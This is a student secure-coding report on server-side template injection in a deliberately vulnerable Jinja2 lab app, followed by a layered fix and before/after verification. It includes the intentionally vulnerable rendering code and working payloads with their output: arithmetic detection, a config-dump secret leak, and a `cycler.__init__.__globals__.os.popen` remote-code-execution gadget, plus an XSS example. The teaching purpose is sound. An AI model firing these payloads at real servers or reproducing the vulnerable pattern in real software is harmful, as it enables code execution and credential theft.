# Server-Side Template Injection (SSTI)

**Module:** WEB404 Secure Coding Practices - Assignment 5 (Topic 5)
**Author:** waangmo22@gmail.com
**Artefacts:** `vulnerable/app.py`, `fixed/app.py`, `exploits/*`, `evidence/demo-output.txt`

---

## 1. Summary

"CardForge" is a greeting-card preview feature. The user types the body of a
card, and the server renders it with the **Jinja2** template engine so that
placeholders such as `{{ user.name }}` are filled in. The whole feature is one
`POST /preview` endpoint.

The vulnerable build makes a single structural mistake: it **concatenates the
user's raw input into the template source** and then compiles and executes
that string with the engine:

```python
source = "<div class='card'>" + body + "</div>"
env.from_string(source).render(config=CONFIG, user=USER)
```

Because the user's text becomes part of the *template*, the engine treats it
as **code**, not **data**. This report demonstrates three escalating
techniques against that one bug:

| # | Technique | Payload | Impact |
| - | --------- | ------- | ------ |
| 1 | Detection | `{{ 7*7 }}` | confirms input is evaluated (returns `49`) |
| 2 | Sensitive data disclosure | `{{ config }}` | dumps `SECRET_KEY` / `DB_PASSWORD` from the render scope |
| 3 | Remote code execution | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` | runs arbitrary shell commands on the server |

`fixed/app.py` keeps the identical feature and output for honest input but
binds user input as template **data**, enables auto-escaping, drops secrets
from the render scope, and runs in a sandboxed environment. After the fix all
three techniques render the payload as inert literal text (section 6,
`evidence/demo-output.txt`).

---

## 2. How the template engine renders input, and where it goes wrong

A template engine exists to combine two separate things: a **template**
(trusted code the developer wrote, with placeholders) and a **context**
(data to drop into those placeholders). Rendering happens in two phases:

1. **Compile** - the template string is parsed into a program. Anything
   between `{{ }}` or `{% %}` becomes executable expressions/statements.
2. **Render** - that program runs with the context, producing output.

The security model depends entirely on *which* of the two inputs the user
controls:

* **Safe design** - the user controls the **context** (data). Their text is
  only ever a *value* substituted into a fixed, developer-authored template.
  It is never parsed in the compile phase, so it can never become code.
* **Vulnerable design (CardForge)** - the user controls the **template
  source** itself. Their text goes through the compile phase, so `{{ ... }}`
  in their input is parsed and executed as a real expression.

SSTI is therefore not "a missing output filter" like XSS - it is **feeding
untrusted input into the code channel of the engine**. That distinction drives
the entire fix in section 5: the primary remediation is not to sanitise the
input but to move it back into the data channel where it belongs. This is the
exact same principle as parameterised queries in Assignment 1 (SQLi) and
output encoding in Assignment 4 (XSS): *keep attacker-controlled data out of
the code/markup channel, permanently.*

---

## 3. Vulnerability mechanism

### 3.1 The sink - `vulnerable/app.py`, `render_card`

```python
def render_card(body: str) -> str:
    source = "<div class='card'>" + body + "</div>"
    template = env.from_string(source)
    return template.render(config=CONFIG, user=USER)
```

`env.from_string(...)` compiles its argument as a Jinja2 template. Because
`body` is part of that argument, every `{{ ... }}` the user types is compiled
and evaluated. `env` is a plain `jinja2.Environment` - **not** sandboxed - so
expressions have access to Python's full object model.

### 3.2 Why `{{ 7*7 }}` returns `49`

In the compile phase, `7*7` is parsed as a multiplication expression, not as
text. During render it evaluates to the integer `49`, which is what appears in
the response. A safe design would have shown the five literal characters
`{{ 7*7 }}`, because it would never have compiled them. This one-character
difference (`49` vs `{{ 7*7 }}`) is the canonical test that distinguishes SSTI
from harmless string reflection.

### 3.3 Why `{{ config }}` leaks secrets

```python
CONFIG = {"SECRET_KEY": "s3cr3t-signing-key-do-not-leak",
          "DB_PASSWORD": "hunter2-prod", "DEBUG": True}
...
template.render(config=CONFIG, user=USER)
```

The attacker's expression executes **inside the render scope**, so every
variable the app passed to `render()` is a normal, readable name. `{{ config }}`
simply prints that dict. Nothing exotic is needed - the app handed the
attacker its own secrets by putting them in the same scope as attacker-run
code. (Real Flask apps expose `config` to every template automatically, which
is why this is a standard first escalation.)

### 3.4 Why the RCE gadget works

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

`cycler` is a harmless helper object Jinja2 injects into every template's
globals. The payload walks Python's object graph from it:

| Step | Yields |
| --- | --- |
| `cycler.__init__` | the bound `__init__` method (a Python function object) |
| `.__globals__` | the dict of globals of the module that defines it |
| `.os` | the `os` module imported in that module |
| `.popen('id').read()` | spawns a shell, runs `id`, reads its output |

Because the plain `Environment` places no restriction on attribute access, the
engine happily resolves `__init__`, `__globals__`, and so on. The command
`id` is harmless proof; the same position runs anything the server process
can. Observed output: `uid=1000(kp) gid=1000(kp) ...` (full transcript in
`evidence/demo-output.txt`).

| Weakness | CWE |
| --- | --- |
| Server-Side Template Injection | CWE-1336 |
| (underlying class) Code Injection | CWE-94 |
| Improper neutralisation of special elements | CWE-74 |

This is OWASP **A03:2021 - Injection** (SSTI is the template-engine member of
the injection family, alongside SQLi and XSS).

---

## 4. Exploitation walkthrough

Setup:

```bash
cd Assigments/Assigment_5
python3 vulnerable/app.py    # http://127.0.0.1:9001
```

Unlike Assignment 4's XSS, **no browser is needed**: SSTI executes on the
server, so `curl` sees the full result directly. Run everything at once with
`bash exploits/run-demo.sh`. For the marked screenshots, replay the same three
`POST /preview` requests in Burp Suite Repeater (see `evidence/README.md`).

### 4.1 Technique 1 - detect the injection

```bash
curl -s http://127.0.0.1:9001/preview --data-urlencode 'body={{ 7*7 }}'
```

**Observed result:**

```json
{ "rendered": "<div class='card'>49</div>" }
```

The arithmetic ran. Had the server been safe, the response would contain the
literal `{{ 7*7 }}`. **Tool:** `exploits/01-ssti-detect.sh` / Burp Repeater.
Screenshot: `evidence/01-detect-vuln.png`.

### 4.2 Technique 2 - sensitive data disclosure

```bash
curl -s http://127.0.0.1:9001/preview --data-urlencode 'body={{ config }}'
```

**Observed result:**

```json
{ "rendered": "<div class='card'>{'SECRET_KEY': 's3cr3t-signing-key-do-not-leak', 'DB_PASSWORD': 'hunter2-prod', 'DEBUG': True}</div>" }
```

The signing key and database password are disclosed with a single ordinary
variable reference - no gadget chain required. A leaked `SECRET_KEY` alone is
often enough to forge session tokens (compare Assignment 2's JWT work).
**Tool:** `exploits/02-config-leak.sh`. Screenshot: `evidence/02-config-vuln.png`.

### 4.3 Technique 3 - remote code execution

```bash
curl -s http://127.0.0.1:9001/preview \
  --data-urlencode "body={{ cycler.__init__.__globals__.os.popen('id').read() }}"
```

**Observed result:**

```json
{ "rendered": "<div class='card'>uid=1000(kp) gid=1000(kp) groups=1000(kp),...\n</div>" }
```

The server ran a shell command and returned its output. This is the worst-case
impact of SSTI and why it is rated critical: full code execution in the
application's process. **Tool:** `exploits/03-rce.sh`. Screenshot:
`evidence/03-rce-vuln.png`.

---

## 5. Remediation

`fixed/app.py` is a line-for-line hardening of `vulnerable/app.py`. Inspect it
with `diff -u vulnerable/app.py fixed/app.py`. It applies three independent
controls; **any one** of them defeats all three techniques, and they are
layered so that a future mistake in one still leaves the others standing.

### 5.1 Separate code from data - the primary fix

```python
CARD_TEMPLATE = env.from_string("<div class='card'>{{ body }}</div>")

def render_card(body: str) -> str:
    body = body.replace(NAME_TOKEN, USER["name"])
    return CARD_TEMPLATE.render(body=body)
```

The template source is now a **constant** the user cannot influence. User text
is bound to the `body` variable - it is **data**, substituted in the render
phase, never parsed in the compile phase. So `{{ 7*7 }}` can never be compiled
into a multiplication; it is just a nine-character string value.

This is the fix that actually matters. It mirrors Assignment 1's parameterised
queries exactly: the template (like a prepared SQL statement) is fixed up
front, and the untrusted value is passed through a channel that is defined to
hold data, not code.

**Supporting the `{{ user.name }}` convenience safely.** The vulnerable build
"needed" full template evaluation only to offer one placeholder. The fixed
build supplies that placeholder by a plain string replacement *before* the
value becomes template data, so users keep the feature without the engine ever
compiling their text:

```python
NAME_TOKEN = "{{ user.name }}"
body = body.replace(NAME_TOKEN, USER["name"])
```

**Blocks Techniques 1, 2, and 3.** Observed (fixed `:9002`):
`<div class='card'>{{ 7*7 }}</div>`, `<div class='card'>{{ config }}</div>`,
and the RCE gadget printed verbatim.

### 5.2 Remove secrets from the render scope - least privilege

```python
return CARD_TEMPLATE.render(body=body)   # no config=, no user=
```

The fixed `render()` passes **only** the data the template actually needs.
`config` and `user` are gone from the scope. This is defence in depth for
Technique 2 specifically: even if controls 5.1 and 5.3 both failed, `{{ config }}`
would raise `UndefinedError` instead of leaking anything, because there is no
longer a `config` name in scope to read. Only ever expose to a template the
variables that template genuinely uses.

### 5.3 Sandboxed environment + auto-escaping - defence in depth

```python
env = SandboxedEnvironment(autoescape=select_autoescape(default=True))
```

Two controls in one line:

* **`SandboxedEnvironment`** intercepts attribute access and refuses the
  "unsafe" attributes (`__init__`, `__globals__`, `__class__`, ...) that every
  RCE gadget must traverse, raising `SecurityError`. If a future code change
  wrongly reintroduced `from_string()` on user input, the RCE gadget in 4.3
  would be stopped here even though control 5.1 had been removed.
* **`autoescape`** HTML-escapes rendered values, so a payload like
  `<img src=x onerror=alert(1)>` becomes inert text - closing the stored-XSS
  door that a card-preview feature would otherwise open (ties back to
  Assignment 4).

`exploits/04-sandbox-check.sh` proves the sandbox directly, offline, by
feeding the RCE gadget to both environment types:

```
vulnerable Environment      : 'uid=1000(kp) gid=1000(kp) ...'   -> RCE
sandboxed  Environment      : blocked -> access to attribute '__init__'
                              of 'type' object is unsafe.          (SecurityError)
```

**Why keep all three rather than just the sandbox?** The sandbox is a
mitigation, not a cure - researchers periodically find sandbox-escape gadgets,
and a sandbox does nothing to stop data disclosure of whatever *is* legitimately
in scope. Code/data separation (5.1) removes the vulnerability itself; the
sandbox and scope-minimisation are backstops for the day someone edits 5.1
back out.

---

## 6. Verification - proof the exploits no longer work

`bash exploits/run-demo.sh` runs every technique against the vulnerable build
(:9001) and the fixed build (:9002), then the offline sandbox check. Full
transcript: `evidence/demo-output.txt`.

| Technique | vs vulnerable `:9001` | vs fixed `:9002` |
| --- | --- | --- |
| 1 - detect (`{{ 7*7 }}`) | `EVALUATED -> input is run as template code` (`49`) | `blocked -> rendered as literal text` (`{{ 7*7 }}`) |
| 2 - data disclosure (`{{ config }}`) | `LEAKED -> SECRET_KEY / DB_PASSWORD disclosed` | `blocked -> rendered as literal text, nothing leaked` |
| 3 - RCE (`cycler...popen('id')`) | `RCE -> shell command executed` (`uid=...`) | `blocked -> rendered as literal text, no code ran` |
| Sandbox check (offline) | plain `Environment` -> `uid=...` | `SandboxedEnvironment` -> `SecurityError` |

Screenshots: `evidence/0X-*-vuln.png`, `evidence/0X-*-fixed.png`,
`evidence/04-sandbox.png`, `evidence/diff.png`.

---

## 7. Why the fix works

* **Detection and RCE** fail because the user's text is never compiled. In the
  fixed build the template is a constant; `{{ 7*7 }}` and the gadget chain are
  values bound to `body` in the render phase, so there is no compile step in
  which they could become expressions. The vulnerability is removed, not
  merely filtered.
* **Data disclosure** fails twice over: the payload is not evaluated (5.1),
  and even if it were, `config` is no longer in the render scope to read
  (5.2).
* **The sandbox** fails the attacker in the hypothetical where a future change
  re-splices input into the template source: every known RCE gadget needs the
  `__init__`/`__globals__`/`__class__` attribute walk, and the sandbox refuses
  those attributes at the engine level, independent of the app's own logic.
* **Auto-escaping** ensures that even benign-looking HTML in a card body
  cannot turn into client-side script, so fixing SSTI does not quietly leave a
  stored-XSS hole behind.

Each control removes a different assumption the vulnerable code made - that
user input was template code worth compiling, that everything in render scope
was safe to expose, and that attribute access inside templates was harmless -
and each keeps working even if one of the others is later broken.

---

## 8. Mapping to learning outcomes

| LO | Where addressed |
| --- | --- |
| LO2 - attack mechanisms | section 2 (compile vs render), section 3 (gadget mechanics), section 4 (three techniques executed) |
| LO7 - advanced web attacks (SSTI, syllabus 5.3) | sections 3.4 and 4.3 (object-graph walk to RCE) |
| LO5 - assess effectiveness of fixes (implicit) | section 6 (before/after matrix), `run-demo.sh` re-tests every exploit |
| LO6 - secure development (implicit) | section 5 (code/data separation, least privilege, sandboxing, auto-escaping), `fixed/app.py` |

## 9. References

* OWASP Top 10 2021 - **A03:2021 Injection**.
* OWASP **Web Security Testing Guide** - Testing for Server-Side Template
  Injection.
* PortSwigger Web Security Academy - **Server-Side Template Injection**
  (detection methodology and the Jinja2 object-graph-to-RCE technique).
* Jinja2 documentation - **Sandbox** (`jinja2.sandbox.SandboxedEnvironment`)
  and **autoescaping**.
* MITRE **CWE-1336** (Improper Neutralization of Special Elements Used in a
  Template Engine), **CWE-94** (Code Injection), **CWE-74** (Injection).

## Appendix - full demo transcript

See `evidence/demo-output.txt` (regenerate with `bash exploits/run-demo.sh`).
